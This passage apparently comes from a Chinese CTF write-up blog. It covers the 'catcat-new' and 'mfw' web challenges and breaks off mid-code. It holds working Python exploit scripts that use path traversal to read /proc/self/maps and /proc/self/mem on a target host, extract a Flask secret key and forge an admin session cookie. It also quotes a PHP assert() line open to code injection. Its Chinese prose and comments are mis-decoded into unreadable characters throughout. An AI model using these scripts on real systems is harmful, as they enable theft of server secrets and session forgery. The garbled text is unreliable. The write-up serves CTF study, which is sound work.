</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;start&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;end&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)[:</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;detail.html&#34;</span><span class="p">,</span> <span class="n">catname</span><span class="o">=</span><span class="n">name</span><span class="p">,</span> <span class="n">info</span><span class="o">=</span><span class="n">cat</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin_can_list_root</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;NoNoNo&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5637</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë¶Åsession‰∏≠admin=1ÁöÑÁî®Êà∑ÊâçËÉΩËÆøÈóÆ/adminÊâçËÉΩÊãøÂà∞flag</p>
<p>sessionÁöÑ‰º™ÈÄ†ÈúÄË¶Åsecret_key,ËÄåsecret_keyÁöÑÂÄºÂèØ‰ª•ÈÄöËøáÂÜÖÂ≠òÊï∞ÊçÆËé∑Âèñ„ÄÇÂÖàËØªÂèñ/proc/self/mapsÊñá‰ª∂Ëé∑ÂèñÂèØËØªÂÜÖÂÆπÁöÑÂÜÖÂ≠òÊò†Â∞ÑÂú∞ÂùÄ„ÄÇ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250116202058251.png"
	width="1663"
	height="836"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250116202058251_hu7808813953879453528.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250116202058251_hu8111072402984526815.png 1024w"
	loading="lazy"
	
		alt="image-20250116202058251"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="477px"
	
></p>
<p>Áî®ËÑöÊú¨ÊâæÂá∫secret_key</p>
<p>Á¨¨‰∏ÄÁßçÁõ¥Êé•ËÆøÈóÆurlÊù•Êü•Êâæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># coding=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="c1">#----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1">###################################</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Edited by lx56@blog.lxscloud.top</span>
</span></span><span class="line"><span class="cl"><span class="c1">###################################</span>
</span></span><span class="line"><span class="cl"><span class="c1">#----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ast</span><span class="o">,</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">abc</span> <span class="kn">import</span> <span class="n">ABC</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask.sessions</span> <span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://61.147.171.105:52969/&#34;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#Ê≠§Á®ãÂ∫èÂè™ËÉΩËøêË°å‰∫éPython3‰ª•‰∏ä</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">version_info</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span> <span class="c1"># &lt; 3.0</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;Must be using at least Python 3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#----------------session ‰º™ÈÄ†,ÂçïÁã¨Áî®‰πüÂèØ‰ª•ËÄÉËôëËøô‰∏™Â∫ìÔºö https://github.com/noraj/flask-session-cookie-manager ----------------</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MockApp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">secret_key</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FSCM</span><span class="p">(</span><span class="n">ABC</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">secret_key</span><span class="p">,</span> <span class="n">session_cookie_structure</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#Encode a Flask session cookie</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">app</span> <span class="o">=</span> <span class="n">MockApp</span><span class="p">(</span><span class="n">secret_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">                <span class="n">session_cookie_structure</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ast</span><span class="o">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="n">session_cookie_structure</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">si</span> <span class="o">=</span> <span class="n">SecureCookieSessionInterface</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">s</span> <span class="o">=</span> <span class="n">si</span><span class="o">.</span><span class="n">get_signing_serializer</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">session_cookie_structure</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;[Encoding error] </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="n">e</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Áî±/proc/self/mapsËé∑ÂèñÂèØËØªÂÜôÁöÑÂÜÖÂ≠òÂú∞ÂùÄÔºåÂÜçÊ†πÊçÆËøô‰∫õÂú∞ÂùÄËØªÂèñ/proc/self/memÊù•Ëé∑Âèñsecret key</span>
</span></span><span class="line"><span class="cl"><span class="n">s_key</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">bypass</span> <span class="o">=</span> <span class="s2">&#34;../..&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#ËØ∑Ê±ÇfileË∑ØÁî±ËøõË°åËØªÂèñ</span>
</span></span><span class="line"><span class="cl"><span class="n">map_list</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;info?file=</span><span class="si">{</span><span class="n">bypass</span><span class="si">}</span><span class="s2">/proc/self/maps&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">map_list</span> <span class="o">=</span> <span class="n">map_list</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">n&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">map_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#ÂåπÈÖçÊåáÂÆöÊ†ºÂºèÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl">    <span class="n">map_addr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;([a-z0-9]+)-([a-z0-9]+) rw&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">map_addr</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">map_addr</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">end</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">map_addr</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Found rw addr:&#34;</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">#ËÆæÁΩÆËµ∑ÂßãÂíåÁªìÊùü‰ΩçÁΩÆÂπ∂ËØªÂèñ/proc/self/mem</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/info?file=</span><span class="si">{</span><span class="n">bypass</span><span class="si">}</span><span class="s2">/proc/self/mem&amp;start=</span><span class="si">{</span><span class="n">start</span><span class="si">}</span><span class="s2">&amp;end=</span><span class="si">{</span><span class="n">end</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#Áî®Âà∞‰∫Ü‰πãÂâçÁâπÂÆöÁöÑSECRET_KEYÊ†ºÂºè„ÄÇÂ¶ÇÊûúÂèëÁé∞*abcdefghÂ≠òÂú®ÂÖ∂‰∏≠ÔºåËØ¥ÊòéÊàêÂäüÊ≥ÑÈú≤secretkey</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;*abcdefgh&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#Ê≠£ÂàôÂåπÈÖçÔºåÊú¨È¢òsecret keyÊ†ºÂºè‰∏∫32‰∏™Â∞èÂÜôÂ≠óÊØçÊàñÊï∞Â≠óÔºåÂÜçÂä†‰∏ä*abcdefgh</span>
</span></span><span class="line"><span class="cl">            <span class="n">secret_key</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;[a-z0-9]</span><span class="si">{32}</span><span class="s2">\*abcdefgh&#34;</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">secret_key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Secret Key:&#34;</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">                <span class="n">s_key</span> <span class="o">=</span> <span class="n">secret_key</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl"> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Á¨¨‰∫åÁßçÂÖà‰øùÂ≠òÂÜÖÂÆπÂà∞ÊñáÊ°£ÂÜçÂà©Áî®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">maps</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;ÊîªÈò≤‰∏ñÁïå-catcat-new/test.txt&#39;</span><span class="p">)</span>  <span class="c1"># ÊâìÂºÄÂêç‰∏∫ &#39;test.txt&#39; ÁöÑÊñá‰ª∂Âπ∂ËµãÂÄºÁªôÂèòÈáè maps</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">maps</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>  <span class="c1"># ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÂπ∂ËµãÂÄºÁªôÂèòÈáè b</span>
</span></span><span class="line"><span class="cl"><span class="n">lst</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">n&#39;</span><span class="p">)</span>  <span class="c1"># Ê†πÊçÆÊç¢Ë°åÁ¨¶ &#39;\n&#39; Â∞ÜÊñá‰ª∂ÂÜÖÂÆπÊãÜÂàÜ‰∏∫ÂàóË°®ÔºåÂπ∂ËµãÂÄºÁªôÂèòÈáè lstÔºåÊò†Â∞ÑË°®‰∏≠ÁöÑÂÜÖÂÆπÊòØ‰∏ÄË°å‰∏ÄË°åÁöÑ„ÄÇ</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lst</span><span class="p">:</span>  <span class="c1"># ÈÅçÂéÜÂàóË°® lst ‰∏≠ÁöÑÊØè‰∏ÄË°åÂÜÖÂÆπ</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;rw&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>  <span class="c1"># Â¶ÇÊûúÂΩìÂâçË°åÂåÖÂê´ &#39;rw&#39;Ôºå&#39;rw&#39; ‰ª£Ë°®ËØ•ÂÜÖÂ≠òÂå∫ÂüüÂèØËØªÂèØÂÜôÔºå&#39;r&#39;‰ª£Ë°®ÂèØËØªÔºå&#39;w&#39;‰ª£Ë°®ÂèØÂÜô</span>
</span></span><span class="line"><span class="cl">        <span class="n">addr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;([0-9a-f]+)-([0-9a-f]+)&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>  <span class="c1"># ‰ΩøÁî®Ê≠£ÂàôË°®ËææÂºèÂú®ÂΩìÂâçË°å‰∏≠ÊêúÁ¥¢Âú∞ÂùÄËåÉÂõ¥Âπ∂‰øùÂ≠òÂà∞ÂèòÈáè addr ‰∏≠</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>  <span class="c1"># Â∞ÜÂú∞ÂùÄËåÉÂõ¥ÁöÑËµ∑ÂßãÂú∞ÂùÄ‰ªéÂçÅÂÖ≠ËøõÂà∂ËΩ¨Êç¢‰∏∫ÂçÅËøõÂà∂ÔºåÂπ∂ËµãÂÄºÁªôÂèòÈáè start</span>
</span></span><span class="line"><span class="cl">        <span class="n">end</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>  <span class="c1"># Â∞ÜÂú∞ÂùÄËåÉÂõ¥ÁöÑÁªìÊùüÂú∞ÂùÄ‰ªéÂçÅÂÖ≠ËøõÂà∂ËΩ¨Êç¢‰∏∫ÂçÅËøõÂà∂ÔºåÂπ∂ËµãÂÄºÁªôÂèòÈáè end</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>  <span class="c1"># ÊâìÂç∞Ëµ∑ÂßãÂú∞ÂùÄÂíåÁªìÊùüÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="c1"># ÊûÑÈÄ†ËØ∑Ê±ÇURLÔºåÁî®‰∫éËØªÂèñ /proc/self/mem Êñá‰ª∂ÁöÑÁâπÂÆöÂå∫Âüü</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://61.147.171.105:52969/info?file=../../../proc/self/mem&amp;start=</span><span class="si">{</span><span class="n">start</span><span class="si">}</span><span class="s2">&amp;end=</span><span class="si">{</span><span class="n">end</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># ÂèëÈÄÅ GET ËØ∑Ê±ÇÂπ∂Ëé∑ÂèñÂìçÂ∫î</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># ‰ΩøÁî®Ê≠£ÂàôË°®ËææÂºè‰ªéÂìçÂ∫îÊñáÊú¨‰∏≠ÊâæÂà∞Á¨¶ÂêàÊåáÂÆöÊ†ºÂºèÁöÑ SECRET_KEY</span>
</span></span><span class="line"><span class="cl">        <span class="n">secret_key</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;[a-z0-9]</span><span class="si">{32}</span><span class="s2">\*abcdefgh&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Â¶ÇÊûúÊâæÂà∞‰∫Ü SECRET_KEYÔºåÂàôÊâìÂç∞Âπ∂ÁªìÊùüÂæ™ÁéØ</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">secret_key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">secret_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250116202436145.png"
	width="878"
	height="344"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250116202436145_hu9681240433414966833.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250116202436145_hu682595922319698558.png 1024w"
	loading="lazy"
	
		alt="image-20250116202436145"
	
	
		class="gallery-image" 
		data-flex-grow="255"
		data-flex-basis="612px"
	
></p>
<p><strong>ÊãøÂà∞ serect_key ‰πãÂêéÔºåÂºÄÂßãÁùÄÊâã‰º™ÈÄ† session:</strong></p>
<p><strong>Êàë‰ª¨ÈúÄË¶ÅÁî®Âà∞‰∏ÄÊ¨æÂú®FlaskÊ°ÜÊû∂‰∏≠‰º™ÈÄ†sessionÁöÑÂ∑•ÂÖ∑ÔºöFlask-session-cookie-manager:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Ëß£ÂØÜÔºö
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python flask_session_cookie_manager3.py decode -s &#34;serect_key&#34; -c &#34;session&#34;ÔºàsessionÈÄöËøáÊäìÂåÖËé∑ÂèñÔºâ„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Âä†ÂØÜÔºö
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python flask_session_cookie_manager3.py encode -s &#34;serect_key&#34; -t &#34;data&#34; (data‰∏∫ÊÉ≥Ë¶Å‰øÆÊîπÁöÑÊï∞ÊçÆ)„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250116204613610.png"
	width="1434"
	height="175"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250116204613610_hu434889499326214115.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250116204613610_hu3426268101853358753.png 1024w"
	loading="lazy"
	
		alt="image-20250116204613610"
	
	
		class="gallery-image" 
		data-flex-grow="819"
		data-flex-basis="1966px"
	
></p>
<p>bpÊäìÂåÖÊîπsession,ÂæóÂà∞flag</p>
<h2 id="mfw">mfw
</h2><p>Êü•ÁúãÂÜÖÂÆπÂèëÁé∞‰ª•page‰∏∫ÂèÇÊï∞‰º†ÂèÇ</p>
<p>ÂÜÖÂÆπËØ¥‰ªñ‰ª•gitÊù•ÁÆ°ÁêÜ‰ª£Á†Å</p>
<p>Êü•ÁúãÊúâÊ≤°ÊúâgitÊ∫êÁ†ÅÊ≥ÑÈú≤</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119111347125.png"
	width="1413"
	height="881"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119111347125_hu16855845551868088325.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119111347125_hu14656409148216422661.png 1024w"
	loading="lazy"
	
		alt="image-20250119111347125"
	
	
		class="gallery-image" 
		data-flex-grow="160"
		data-flex-basis="384px"
	
></p>
<p>Á°ÆÂÆûÊúâÔºåÁî®githack‰∏ãËΩΩÊ∫êÁ†Å</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119111743719.png"
	width="620"
	height="218"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119111743719_hu3348633155416034242.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119111743719_hu700488049241296127.png 1024w"
	loading="lazy"
	
		alt="image-20250119111743719"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="682px"
	
></p>
<p>Âè™Êúâindex.phpÊòØÊúâÁî®ÁöÑ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119112646959.png"
	width="851"
	height="180"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119112646959_hu11324955619647905831.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119112646959_hu1683497016388462821.png 1024w"
	loading="lazy"
	
		alt="image-20250119112646959"
	
	
		class="gallery-image" 
		data-flex-grow="472"
		data-flex-basis="1134px"
	
></p>
<p>‰∏ªË¶ÅÁöÑÂà©Áî®ÁÇπÂú®Ëøô</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">assert</span><span class="p">(</span><span class="s2">&#34;strpos(&#39;</span><span class="si">$file</span><span class="s2">&#39;, &#39;..&#39;) === false&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Detected hacking attempt!&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
